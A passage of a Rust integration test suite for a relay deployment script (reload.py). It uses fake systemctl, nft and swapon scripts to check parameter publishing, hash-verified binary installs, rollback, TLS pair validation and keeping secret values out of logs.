    let mut cmd = Command::new("/usr/bin/python3");
    isolate(&mut cmd, dir);
    cmd.args(["-I", "-B", "-c"]).arg(format!("{prelude}{body}")).arg(infra().join("relay/reload.py")).args(args).current_dir(dir).env("PATH", "/usr/bin:/bin");
    let o = bounded(&mut cmd, "reload.py as a module");
    assert!(o.status.success(), "{}", all(&o));
    assert!(!infra().join("relay/__pycache__").exists(), "bytecode written into infra/relay");
    stdout(&o)
}

/// The systemctl the reload unit runs (`AI_ENV_RELAY_SYSTEMCTL`): logs `$*`; `restart` records what `current` points at;
/// `is-active` answers `FAKE_SYSTEMCTL_INITIAL` (default inactive) before any restart, then `active` (exit 0) when
/// `FAKE_SYSTEMCTL_GOOD` lists the recorded binary, else `failed` (exit 3).
const SYSTEMCTL: &str = r#"#!/bin/sh
printf '%s\n' "$*" >> "$FAKE_SYSTEMCTL_LOG"
case "$1" in
  restart) readlink "$AI_ENV_RELAY_ROOT/usr/local/libexec/ai-env-relay/current" > "$FAKE_SYSTEMCTL_STATE" || : > "$FAKE_SYSTEMCTL_STATE" ;;
  is-active)
    if [ -f "$FAKE_SYSTEMCTL_STATE" ]; then
      ran=$(cat "$FAKE_SYSTEMCTL_STATE"); word=failed
      for good in ${FAKE_SYSTEMCTL_GOOD:-}; do test "$good" = "$ran" && word=active; done
    else
      word=${FAKE_SYSTEMCTL_INITIAL:-inactive}
    fi
    echo "$word"
    test "$word" = active || exit 3 ;;
esac
exit 0
"#;

/// The nft the reload unit runs (`AI_ENV_RELAY_NFT`): logs `$*`, keeps what it was given to load and what live/peers.json
/// held then; with `FAKE_NFT_FAIL` it says what the real one says of a set it refuses (nft 1.0 on AL2023: the Error line,
/// the file's line, the carets) and exits 1, and the kernel keeps the table it had.
const NFT: &str = r#"#!/bin/sh
printf '%s\n' "$*" >> "$FAKE_NFT_LOG"
if [ -n "${FAKE_NFT_FAIL:-}" ]; then
  printf '%s:4:81-95: Error: conflicting intervals specified\n' "$2" >&2
  sed -n 4p "$2" >&2
  printf '                ~~~~~~~~~~~~~~~  ^^^^^^^^^^^^^^^\n' >&2
  exit 1
fi
cp "$2" "$FAKE_NFT_LOADED"
cp "$AI_ENV_RELAY_ROOT/var/lib/ai-env-relay/live/peers.json" "$FAKE_NFT_LOADED.peers" 2> /dev/null || : > "$FAKE_NFT_LOADED.peers"
"#;

/// The swapon the reload unit runs (`AI_ENV_RELAY_SWAPON`): logs `$*`; turns the file on in the planted /proc/swaps,
/// unless `FAKE_SWAPON_FAIL`.
const SWAPON: &str = r#"#!/bin/sh
printf '%s\n' "$*" >> "$FAKE_SWAPON_LOG"
if [ -n "${FAKE_SWAPON_FAIL:-}" ]; then
  echo "swapon: $1: swapon failed: Invalid argument" >&2
  exit 1
fi
printf '%s file 524284 0 -2\n' "$1" >> "$AI_ENV_RELAY_ROOT/proc/swaps"
"#;

/// How [`World::run`] runs reload.py: as its unit does (`/usr/bin/python3 -I`, then `sys.exit(main())`), with
/// `os.statvfs` a stub that answers for `/` alone, `argv[2]` percent of it used (R-95: no run reads the Mac's own disk).
const STATVFS_STUB: &str = "import os, runpy, sys, types\n\
    used = int(sys.argv[2])\n\
    stub = types.SimpleNamespace(f_blocks=100, f_bfree=100 - used, f_bavail=100 - used)\n\
    os.statvfs = lambda path: stub if path == '/' else 1 / 0\n\
    sys.argv = sys.argv[1:2]\n\
    runpy.run_path(sys.argv[0], run_name='__main__')\n";

/// A relay instance as its reload unit sees it: the §I-infra.3.3 tree under `root/` (AI_ENV_RELAY_ROOT), the fake
/// aws's Parameter Store (`ssm/`) and bucket (`s3/`), the systemctl fake's log and state, and every value written.
struct World {
    t: tempfile::TempDir,
    /// `FAKE_SYSTEMCTL_GOOD`: the binaries (`ai-env-relay-<sha16>`) that come up.
    good: String,
    /// Every parameter value written so far, none of which may reach a log line (I-T21).
    values: Vec<String>,
    /// The root volume's percent used, as the runs' `statvfs` stub answers it ([`STATVFS_STUB`]; 50 unless set).
    disk: u32,
}

/// One run of the reload unit.
struct Ran {
    code: i32,
    /// Its one line (stderr, the journal's).
    line: String,
    /// This run's systemctl, aws, nft and swapon calls.
    systemctl: Vec<String>,
    aws: Vec<String>,
    nft: Vec<String>,
    swapon: Vec<String>,
    /// Unix seconds before and after it.
    from: u64,
    to: u64,
}

impl World {
    fn new() -> World {
        let t = tempfile::tempdir().unwrap();
        let root = t.path().join("root");
        for d in ["etc/ai-env-relay", "usr/local/libexec/ai-env-relay", "var/lib/ai-env-relay/live", "var/lib/ai-env-relay/stage", "var/log/ai-env-relay/requests"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        std::fs::write(root.join("etc/ai-env-relay/reload.env"), "PARAM_PREFIX=/ai-env/relay\nREGION=eu-central-1\n").unwrap();
        std::fs::create_dir_all(root.join("proc")).unwrap();
        std::fs::write(root.join("proc/swaps"), format!("{SWAPS_HEADER}{}/swapfile file 524284 0 -2\n", root.display())).unwrap();
        std::fs::create_dir_all(t.path().join("bin")).unwrap();
        executable(&t.path().join("bin/aws"), &text(&Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fakes/aws.sh")));
        executable(&t.path().join("bin/systemctl"), SYSTEMCTL);
        executable(&t.path().join("bin/nft"), NFT);
        executable(&t.path().join("bin/swapon"), SWAPON);
        World { t, good: String::new(), values: vec![], disk: 50 }
    }

    /// /etc/ai-env-relay/peers.nft, as the run left it.
    fn peers_nft(&self) -> PathBuf {
        self.root().join("etc/ai-env-relay/peers.nft")
    }

    fn root(&self) -> PathBuf {
        self.t.path().join("root")
    }

    fn live(&self, file: &str) -> PathBuf {
        self.root().join("var/lib/ai-env-relay/live").join(file)
    }

    fn libexec(&self, file: &str) -> PathBuf {
        self.root().join("usr/local/libexec/ai-env-relay").join(file)
    }

    /// What `current` points at ("" when nothing).
    fn current(&self) -> String {
        std::fs::read_link(self.libexec("current")).map(|p| p.display().to_string()).unwrap_or_default()
    }

    /// What `previous` records.
    fn previous(&self) -> String {
        text(&self.root().join("var/lib/ai-env-relay/previous"))
    }

    fn parameter(&self, p: &str) -> PathBuf {
        self.t.path().join("ssm/ai-env/relay").join(p)
    }

    /// `/ai-env/relay/<p>` of the fake Parameter Store holds `value`.
    fn set(&mut self, p: &str, value: &str) {
        std::fs::create_dir_all(self.parameter(p).parent().unwrap()).unwrap();
        std::fs::write(self.parameter(p), value).unwrap();
        self.values.push(value.to_string());
    }

    fn delete(&self, p: &str) {
        std::fs::remove_file(self.parameter(p)).unwrap();
    }

    fn value(&self, p: &str) -> String {
        text(&self.parameter(p))
    }

    fn object(&self, key: &str) -> PathBuf {
        self.t.path().join("s3").join(BUCKET).join(key)
    }

    /// `bytes` as the bucket's object under its hash-keyed key, and the artifact parameter naming it; its sha16.
    fn binary(&mut self, bytes: &[u8]) -> String {
        let sha = hex::encode(Sha256::digest(bytes));
        let key = format!("relay/ai-env-relay-{}", &sha[..16]);
        std::fs::create_dir_all(self.object(&key).parent().unwrap()).unwrap();
        std::fs::write(self.object(&key), bytes).unwrap();
        self.set("artifact", &json!({"bucket": BUCKET, "key": key, "sha256": sha, "version": "0.12.0"}).to_string());
        sha[..16].to_string()
    }

    /// The five lists, the TLS pair and V1 in the bucket, V1 the binary that comes up; V1's sha16.
    fn complete(&mut self) -> String {
        for (p, n) in [("workers", 1), ("grants", 2), ("token-signers", 3)] {
            self.set(p, &placeholder(n));
        }
        self.set("peers", &peers("198.51.100.0/24"));
        self.set("access", &access(&["g-a"]));
        self.set("tls", &tls_pair("QUFB"));
        let v1 = self.binary(V1);
        self.good = binary_name(&v1);
        v1
    }

    /// live/'s files, each with its bytes and inode (a write is a new file renamed over the old one).
    fn snapshot(&self) -> BTreeMap<String, (Vec<u8>, u64)> {
        std::fs::read_dir(self.live(""))
            .unwrap()
            .flatten()
            .map(|e| (e.file_name().to_string_lossy().to_string(), (std::fs::read(e.path()).unwrap(), e.metadata().unwrap().ino())))
            .collect()
    }

    /// One run of reload.py as its unit runs it (reload.env's two names in its environment; [`STATVFS_STUB`]), the
    /// test knobs set; then I-T21's check of its line and the whole reload.log.
    fn run(&mut self, envs: &[(&str, &str)]) -> Ran {
        let t = self.t.path();
        let (systemctl_log, aws_log, nft_log, swapon_log) = (t.join("systemctl.log"), t.join("aws.log"), t.join("nft.log"), t.join("swapon.log"));
        let lines = |p: &Path| -> Vec<String> { text(p).lines().map(str::to_string).collect() };
        let (systemctl_before, aws_before, nft_before, swapon_before) = (lines(&systemctl_log).len(), lines(&aws_log).len(), lines(&nft_log).len(), lines(&swapon_log).len());
        let from = now();
        let mut cmd = Command::new("/usr/bin/python3");
        isolate(&mut cmd, t);
        cmd.args(["-I", "-B", "-c", STATVFS_STUB])
            .arg(infra().join("relay/reload.py"))
            .arg(self.disk.to_string())
            .env("PATH", "/usr/bin:/bin")
            .env("PARAM_PREFIX", "/ai-env/relay")
            .env("REGION", "eu-central-1")
            .env("AI_ENV_RELAY_ROOT", self.root())
            .env("AI_ENV_RELAY_AWS", t.join("bin/aws"))
            .env("AI_ENV_RELAY_SYSTEMCTL", t.join("bin/systemctl"))
            .env("AI_ENV_RELAY_NFT", t.join("bin/nft"))
            .env("AI_ENV_RELAY_SWAPON", t.join("bin/swapon"))
            .env("AI_ENV_RELAY_WAIT_S", "2")
            .env("FAKE_NFT_LOG", &nft_log)
            .env("FAKE_NFT_LOADED", t.join("nft.loaded"))
            .env("FAKE_SWAPON_LOG", &swapon_log)
            .env("FAKE_AWS_SSM_DIR", t.join("ssm"))
            .env("FAKE_AWS_S3_DIR", t.join("s3"))
            .env("FAKE_AWS_LOG", &aws_log)
            .env("FAKE_AWS_PIN_ALL", "1")
            .env("FAKE_SYSTEMCTL_LOG", &systemctl_log)
            .env("FAKE_SYSTEMCTL_STATE", t.join("systemctl.state"))
            .env("FAKE_SYSTEMCTL_GOOD", &self.good)
            .envs(envs.iter().copied());
        let o = bounded(&mut cmd, "reload.py");
        let to = now();
        let line = stderr(&o);
        assert_eq!(stdout(&o), "", "the unit writes its one line to stderr: {line}");
        assert_eq!(line.lines().count(), 1, "one line per run: {line}");
        self.never_logged(&line);
        assert!(std::fs::read_dir(self.live("")).unwrap().flatten().all(|e| LIVE.contains(&e.file_name().to_string_lossy().as_ref())), "live/ holds only its seven files");
        Ran {
            code: o.status.code().unwrap_or(-1),
            line: line.trim_end().to_string(),
            systemctl: lines(&systemctl_log)[systemctl_before..].to_vec(),
            aws: lines(&aws_log)[aws_before..].to_vec(),
            nft: lines(&nft_log)[nft_before..].to_vec(),
            swapon: lines(&swapon_log)[swapon_before..].to_vec(),
            from,
            to,
        }
    }

    /// I-T21: neither a run's line nor reload.log holds a parameter's value, the placeholders' or the pairs' bodies, a
    /// PEM marker or a hash of a `tls` value.
    fn never_logged(&self, line: &str) {
        let log = text(&self.root().join("var/log/ai-env-relay/reload.log"));
        let mut words: Vec<String> = ["0199a1b2-0000-7000-8000", "QUFB", "QkJC", "BEGIN", "PRIVATE"].map(String::from).to_vec();
        for v in self.values.iter().filter(|v| v.len() >= 8) {
            words.push(v.clone());
            if v.contains("BEGIN") {
                let h = hex::encode(Sha256::digest(v.as_bytes()));
                words.push(h[..16].to_string());
                words.push(h);
            }
        }
        for w in &words {
            assert!(!line.contains(w.as_str()) && !log.contains(w.as_str()), "I-T21: {w:?} in a log line:\n{line}{log}");
        }
    }
}

/// I-T14: all seven parameters valid: the six files published byte for byte (0640), `fetched` stamped within the run,
/// one get-parameters, the binary downloaded, hashed, installed (0755) and started; a second run writes nothing but
/// `fetched`, and neither restarts nor reloads the relay.
#[test]
fn reload_publishes_the_parameters_and_stamps_the_fetch() {
    let mut w = World::new();
    let v1 = w.complete();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    for (p, file) in PUBLISHED {
        assert_eq!(text(&w.live(file)), w.value(p), "{file}");
        assert_eq!(mode(&w.live(file)), 0o640, "{file}");
    }
    let fetched: u64 = text(&w.live("fetched")).trim().parse().unwrap();
    assert!((ran.from..=ran.to).contains(&fetched) && mode(&w.live("fetched")) == 0o640, "fetched {fetched}");
    assert_eq!(ran.aws.iter().filter(|l| l.starts_with("ssm ")).cloned().collect::<Vec<_>>(), [GET_PARAMETERS]);
    let download = w.root().join("var/lib/ai-env-relay/stage/download");
    let get = format!("s3api get-object --bucket {BUCKET} --key relay/ai-env-relay-{v1} --region eu-central-1 --endpoint-url https://s3.eu-central-1.amazonaws.com {}", download.display());
    assert!(ran.aws.contains(&get), "{:#?}", ran.aws);
    assert!(!download.exists());
    assert_eq!(w.current(), binary_name(&v1));
    assert_eq!(std::fs::read(w.libexec(&binary_name(&v1))).unwrap(), V1);
    assert_eq!(mode(&w.libexec(&binary_name(&v1))), 0o755);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reset-failed ai-env-relay.service", "restart ai-env-relay.service", "is-active ai-env-relay.service"]);
    assert!(
        ran.line.starts_with("ai-env-relay-reload: ok fetched=") && ran.line.ends_with(&format!(" changed=workers,grants,token-signers,peers,access,tls absent=none artifact={v1} tls=present relay=active")),
        "{}",
        ran.line
    );

    let before: Vec<u64> = PUBLISHED.iter().map(|(_, f)| std::fs::metadata(w.live(f)).unwrap().ino()).collect();
    let again = w.run(&[]);
    assert_eq!(again.code, 0, "{}", again.line);
    assert_eq!(PUBLISHED.iter().map(|(_, f)| std::fs::metadata(w.live(f)).unwrap().ino()).collect::<Vec<_>>(), before, "nothing written but fetched");
    assert_eq!(again.systemctl, ["is-active ai-env-relay.service"], "neither a restart nor a reload");
    assert!(!again.aws.iter().any(|l| l.starts_with("s3api")), "the installed binary is not fetched again");
    assert!(again.line.contains(" changed=none absent=none "), "{}", again.line);

    // A state directory gone is made again in §3.3's modes, not the unit's umask (077): itself and live/ 0750, stage/ 0700.
    let state = w.root().join("var/lib/ai-env-relay");
    std::fs::remove_dir_all(&state).unwrap();
    let third = w.run(&[]);
    assert_eq!(third.code, 0, "{}", third.line);
    assert_eq!([mode(&state), mode(&state.join("live")), mode(&state.join("stage"))], [0o750, 0o750, 0o700]);
    assert_eq!(text(&w.live("workers.json")), w.value("workers"), "published again");
}

/// I-T15: a list document deleted from SSM is removed from live/ (the relay told to reload), as is an invalid one (the
/// run then fails, naming it): `{`, a 4097-byte value, a value with a NUL. A removed whitelist never stays in force.
#[test]
fn reload_removes_a_deleted_authorization_document_and_an_invalid_one() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    w.delete("workers");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(!w.live("workers.json").exists() && ran.line.contains(" changed=workers absent=workers "), "{}", ran.line);
    assert!(ran.systemctl.contains(&"reload ai-env-relay.service".to_string()), "{:?}", ran.systemctl);
    w.set("grants", "{");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(!w.live("grants.json").exists() && ran.line.contains(" why=grants: not JSON"), "{}", ran.line);
    w.set("grants", &placeholder(2));
    assert_eq!(w.run(&[]).code, 0);
    for (value, why) in [(format!("[{}0]", "0,".repeat(2047)), "token-signers: over 4096 bytes"), (format!("{}\u{0}", placeholder(3)), "token-signers: not printable ASCII")] {
        w.set("token-signers", &placeholder(3));
        assert_eq!(w.run(&[]).code, 0);
        assert!(w.live("token-signers.json").exists());
        w.set("token-signers", &value);
        let ran = w.run(&[]);
        assert_eq!(ran.code, 1, "{}", ran.line);
        assert!(!w.live("token-signers.json").exists() && ran.line.contains(&format!(" why={why}")), "{why}: {}", ran.line);
    }
}

/// I-T16: an invalid new pair (no key block, two key blocks, a certificate after the key) leaves tls.pem as it was and
/// fails the run; a deleted pair is removed and the relay waits for one (no start); a new valid pair replaces the file
/// and reloads the relay. live/ never holds a certificate or a key of its own ([`World::run`]).
#[test]
fn reload_keeps_the_tls_pair_whole() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let pair = text(&w.live("tls.pem"));
    let (cert, key) = (pem("CERTIFICATE", "QUFB"), key_block("QUFB"));
    for (what, value) in [("no key block", cert.clone()), ("two key blocks", format!("{cert}{key}{key}")), ("a certificate after the key", format!("{cert}{key}{cert}"))] {
        w.set("tls", &value);
        let ran = w.run(&[]);
        assert_eq!(ran.code, 1, "{what}: {}", ran.line);
        assert_eq!(text(&w.live("tls.pem")), pair, "{what}: tls.pem unchanged");
        assert!(ran.line.contains(" why=tls: not certificates then one PKCS#8 key block"), "{what}: {}", ran.line);
    }
    w.delete("tls");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(!w.live("tls.pem").exists() && ran.line.ends_with(" tls=absent relay=waiting-for-tls"), "{}", ran.line);
    assert!(!ran.systemctl.iter().any(|c| c.starts_with("restart ") || c.starts_with("start ")), "no start: {:?}", ran.systemctl);
    let renewed = tls_pair("QkJC");
    w.set("tls", &renewed);
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(text(&w.live("tls.pem")), renewed);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
}

/// I-T17: a binary is installed only when its SHA-256 is the parameter's: another object's bytes, an object over 64
/// MiB and a missing object each install nothing and fail the run; a good one is installed 0755 under its sha16,
/// `current` switched to it and `previous` naming the old one, through one pinned `s3api get-object`.
#[test]
fn reload_installs_a_new_binary_only_with_its_hash() {
    let mut w = World::new();
    let v1 = w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let v2 = w.binary(V2);
    let object = w.object(&format!("relay/ai-env-relay-{v2}"));
    let download = w.root().join("var/lib/ai-env-relay/stage/download");
    let get = format!("s3api get-object --bucket {BUCKET} --key relay/ai-env-relay-{v2} --region eu-central-1 --endpoint-url https://s3.eu-central-1.amazonaws.com {}", download.display());
    for what in ["another object's bytes", "an object over 64 MiB", "no object"] {
        let why = match what {
            "another object's bytes" => {
                std::fs::write(&object, V1).unwrap();
                "the artifact's SHA-256 is not the parameter's: nothing installed"
            }
            "an object over 64 MiB" => {
                std::fs::File::create(&object).unwrap().set_len((64 << 20) + 1).unwrap();
                "the artifact is over 64 MiB: nothing installed"
            }
            _ => {
                std::fs::remove_file(&object).unwrap();
                "get-object: An error occurred (NoSuchKey)"
            }
        };
        let ran = w.run(&[]);
        assert_eq!(ran.code, 1, "{what}: {}", ran.line);
        assert!(ran.line.contains(why) && ran.line.contains(": nothing installed"), "{what}: {}", ran.line);
        assert_eq!(ran.aws.iter().filter(|l| l.starts_with("s3api")).cloned().collect::<Vec<_>>(), std::slice::from_ref(&get), "{what}");
        assert_eq!(w.current(), binary_name(&v1), "{what}: current unchanged");
        assert!(!w.libexec(&binary_name(&v2)).exists() && !download.exists(), "{what}: nothing installed");
    }
    std::fs::write(&object, V2).unwrap();
    w.good = format!("{} {}", binary_name(&v1), binary_name(&v2));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(std::fs::read(w.libexec(&binary_name(&v2))).unwrap(), V2);
    assert_eq!(mode(&w.libexec(&binary_name(&v2))), 0o755);
    assert_eq!((w.current(), w.previous()), (binary_name(&v2), format!("{}\n", binary_name(&v1))));
    assert!(ran.line.ends_with(&format!(" artifact={v2} tls=present relay=active")), "{}", ran.line);

    // The cap holds while the download is written (RLIMIT_FSIZE in the child), so an object over it never fills the
    // disk: a writer of 5000 bytes under a cap of 1001 stops there, and fails.
    let t = tempfile::tempdir().unwrap();
    std::fs::write(t.path().join("object"), [b'a'; 5000]).unwrap();
    let capped = reload_module(t.path(), "code, _, _ = m.call(['/bin/sh', '-c', 'cat object > download'], 10, 1001)\nprint(json.dumps([code, os.path.getsize('download')]))", &[]);
    let capped: Value = serde_json::from_str(capped.trim()).unwrap();
    assert!(capped[0] != 0 && capped[1] == 1001, "{capped}");
}

/// I-T18: a new binary that does not come up within the wait is rolled back to the old one (restarted again, the run
/// failed, `rollback=<old sha16>`) and refused; with neither coming up the relay is `failed`, the old binary restarted
/// alone. A binary beyond `current` and `previous` is removed only after a run that succeeded: here the next
/// artifact's, which is tried.
#[test]
fn reload_rolls_back_a_binary_that_does_not_start() {
    let mut w = World::new();
    let v1 = w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let stale = w.libexec("ai-env-relay-00000000000000aa");
    std::fs::write(&stale, b"an older relay").unwrap();
    let v2 = w.binary(V2);
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.ends_with(&format!(" relay=active rollback={v1} why=the new binary did not come up: rolled back")), "{}", ran.line);
    assert_eq!(ran.systemctl.iter().filter(|c| *c == "restart ai-env-relay.service").count(), 2, "{:?}", ran.systemctl);
    assert!(w.current() == binary_name(&v1) && w.libexec(&binary_name(&v2)).exists(), "back on the old binary");
    assert!(stale.exists(), "nothing pruned after a failed run");
    w.good = String::new();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.contains(" relay=failed ") && !ran.line.contains(" rollback="), "{}", ran.line);
    assert_eq!(ran.systemctl.iter().filter(|c| *c == "restart ai-env-relay.service").count(), 1, "the old binary alone: {:?}", ran.systemctl);
    assert!(w.current() == binary_name(&v1) && stale.exists());
    let v3 = w.binary(V3);
    w.good = format!("{} {}", binary_name(&v1), binary_name(&v3));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!((w.current(), w.previous()), (binary_name(&v3), format!("{}\n", binary_name(&v1))));
    assert!(!stale.exists() && !w.libexec(&binary_name(&v2)).exists() && w.libexec(&binary_name(&v1)).exists(), "pruned to current and previous");
}

/// I-T54: a binary rolled back is refused until the artifact names another: the runs after the rollback download
/// nothing, switch nothing and leave the old binary running (each fails, naming the refused one; a changed list still
/// reaches the relay); a binary the artifact names next is tried, and its success ends the refusal.
#[test]
fn reload_never_switches_again_to_a_binary_it_rolled_back() {
    let mut w = World::new();
    let v1 = w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let v2 = w.binary(V2);
    let ran = w.run(&[]);
    assert!(ran.code == 1 && ran.line.contains(&format!(" rollback={v1} ")), "{}", ran.line);
    let state = w.root().join("var/lib/ai-env-relay");
    assert_eq!(text(&state.join("refused")), format!("{}\n", binary_name(&v2)));
    assert!(!state.join("trying").exists(), "the verdict is in");
    for changed in [false, true] {
        if changed {
            w.set("grants", &placeholder(4));
        }
        let ran = w.run(&[]);
        assert_eq!(ran.code, 1, "{}", ran.line);
        let why = format!(" artifact={v2} tls=present relay=active why={v2} did not come up: not switched to again until the artifact names another binary");
        assert!(ran.line.ends_with(&why), "{}", ran.line);
        let reload = if changed { vec!["reload ai-env-relay.service"] } else { vec![] };
        assert_eq!(ran.systemctl, [vec!["is-active ai-env-relay.service"], reload].concat(), "the old binary left running");
        assert!(!ran.aws.iter().any(|l| l.starts_with("s3api")) && w.current() == binary_name(&v1), "nothing downloaded or switched");
    }
    let v3 = w.binary(V3);
    w.good = format!("{} {}", binary_name(&v1), binary_name(&v3));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(w.current(), binary_name(&v3));
    assert!(!state.join("refused").exists() && !state.join("trying").exists());
}

/// I-T55: a run cut off between the switch and its verdict (the unit's TimeoutStartSec, a reboot, a stop) leaves
/// `trying` naming the new, current binary while the old one still runs; the next run judges that trial: the new binary
/// restarted, then kept when it comes up, else rolled back and refused.
#[test]
fn reload_judges_the_trial_a_cut_off_run_left() {
    for comes_up in [true, false] {
        let mut w = World::new();
        let v1 = w.complete();
        assert_eq!(w.run(&[]).code, 0);
        let v2 = w.binary(V2);
        let state = w.root().join("var/lib/ai-env-relay");
        std::fs::write(w.libexec(&binary_name(&v2)), V2).unwrap();
        std::fs::write(state.join("previous"), format!("{}\n", binary_name(&v1))).unwrap();
        std::fs::write(state.join("trying"), format!("{}\n", binary_name(&v2))).unwrap();
        std::fs::remove_file(w.libexec("current")).unwrap();
        std::os::unix::fs::symlink(binary_name(&v2), w.libexec("current")).unwrap();
        if comes_up {
            w.good = format!("{} {}", binary_name(&v1), binary_name(&v2));
        }
        let ran = w.run(&[]);
        assert!(ran.systemctl.contains(&"restart ai-env-relay.service".to_string()), "{comes_up}: the trial judged: {:?}", ran.systemctl);
        assert!(!ran.aws.iter().any(|l| l.starts_with("s3api")) && !state.join("trying").exists(), "{comes_up}: {:?}", ran.aws);
        if comes_up {
            assert_eq!((ran.code, w.current()), (0, binary_name(&v2)), "{}", ran.line);
        } else {
            assert!(ran.code == 1 && ran.line.contains(&format!(" relay=active rollback={v1} ")), "{}", ran.line);
            assert_eq!((w.current(), text(&state.join("refused"))), (binary_name(&v1), format!("{}\n", binary_name(&v2))));
        }
    }
}

/// I-T19: without a TLS pair the binary is installed but the relay neither started nor restarted (it waits for the
/// pair); the run after the pair arrives starts it.
#[test]
fn reload_waits_for_the_tls_pair_before_starting_the_relay() {
    let mut w = World::new();
    for (p, n) in [("workers", 1), ("grants", 2), ("token-signers", 3)] {
        w.set(p, &placeholder(n));
    }
    w.set("peers", &peers("198.51.100.0/24"));
    let v1 = w.binary(V1);
    w.good = binary_name(&v1);
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(w.current(), binary_name(&v1));
    assert!(ran.line.contains(" absent=access,tls ") && ran.line.ends_with(" tls=absent relay=waiting-for-tls"), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service"], "no restart or start");
    w.set("tls", &tls_pair("QUFB"));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.systemctl.contains(&"restart ai-env-relay.service".to_string()) && ran.line.ends_with(" tls=present relay=active"), "{}: {:?}", ran.line, ran.systemctl);
}

/// I-T20: with the relay active on the current binary, a changed list sends exactly one `systemctl reload`, an
/// unchanged run none.
#[test]
fn reload_reloads_the_relay_on_a_change_and_only_then() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    w.set("grants", &placeholder(4));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
    assert!(ran.line.contains(" changed=grants "), "{}", ran.line);
    let ran = w.run(&[]);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service"]);
}

/// I-T21: every run of I-T14 to I-T22 checks its line and the whole reload.log ([`World::never_logged`]); this one walks
/// the lines that name a parameter (an invalid list, an invalid pair, a failed fetch, a rollback) and reads reload.log
/// itself: one line per run, each word after the verdict a key of I-R36's.
#[test]
fn reload_never_logs_a_value() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    w.set("grants", "{\"placeholder\": NaN}");
    w.set("tls", &format!("{}{}", tls_pair("QkJC"), key_block("QkJC")));
    let ran = w.run(&[]);
    assert!(ran.code == 1 && ran.line.contains(" why=grants: not JSON; tls: not certificates then one PKCS#8 key block"), "{}", ran.line);
    assert_eq!(w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]).code, 1);
    w.binary(V2);
    assert_eq!(w.run(&[]).code, 1);
    let log = text(&w.root().join("var/log/ai-env-relay/reload.log"));
    assert_eq!(log.lines().count(), 4, "{log}");
    let keys = ["fetched", "changed", "absent", "artifact", "tls", "relay", "rollback", "why"];
    for line in log.lines() {
        let words: Vec<&str> = line.split(' ').collect();
        assert!(words[0] == "ai-env-relay-reload:" && (words[1] == "ok" || words[1] == "FAILED"), "{line}");
        let named: Vec<&str> = words[2..].iter().take_while(|word| !word.starts_with("why=")).map(|word| word.split('=').next().unwrap()).collect();
        assert!(named.iter().all(|k| keys.contains(k)), "{line}");
    }
}

/// I-T22: a fetch that fails three times fails the run closed: `fetched=none`, live/ as it was (not even the stamp),
/// no systemctl call.
#[test]
fn reload_fails_closed_on_a_failed_fetch() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let before = w.snapshot();
    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert_eq!(ran.aws, [GET_PARAMETERS; 3], "three tries");
    assert!(ran.line.contains(" fetched=none ") && ran.line.contains(" why=get-parameters: An error occurred (AccessDeniedException)"), "{}", ran.line);
    assert_eq!(w.snapshot(), before, "live/ untouched");
    assert_eq!(ran.systemctl, Vec::<String>::new());
}

/// I-T23: outside a test root every knob is ignored: a bad environment exits 2 with I-R29's text, and the aws and
/// systemctl the knobs name are never run; the unit's `Run`, built from every knob without `AI_ENV_RELAY_ROOT`, takes
/// none of them (the instance's paths, `aws`, `systemctl`, `/usr/sbin/nft`, `swapon`, 60 s), and with it takes them all.
#[test]
fn reload_ignores_its_knobs_outside_a_test_root() {
    let t = tempfile::tempdir().unwrap();
    let fake = t.path().join("logged");
    executable(&fake, &format!("#!/bin/sh\nprintf '%s\\n' \"$*\" >> {:?}\n", t.path().join("called").display().to_string()));
    for (prefix, region) in [(None, "eu-central-1"), (Some("ai-env/relay"), "eu-central-1"), (Some("/ai-env/relay"), "eu-central")] {
        let mut cmd = Command::new("/usr/bin/python3");
        isolate(&mut cmd, t.path());
        cmd.arg("-I")
            .arg(infra().join("relay/reload.py"))
            .env("PATH", "/usr/bin:/bin")
            .env("REGION", region)
            .env("AI_ENV_RELAY_AWS", &fake)
            .env("AI_ENV_RELAY_SYSTEMCTL", &fake)
            .env("AI_ENV_RELAY_WAIT_S", "2");
        match prefix {
            Some(p) => cmd.env("PARAM_PREFIX", p),
            None => cmd.env_remove("PARAM_PREFIX"),
        };
        let o = bounded(&mut cmd, "reload.py");
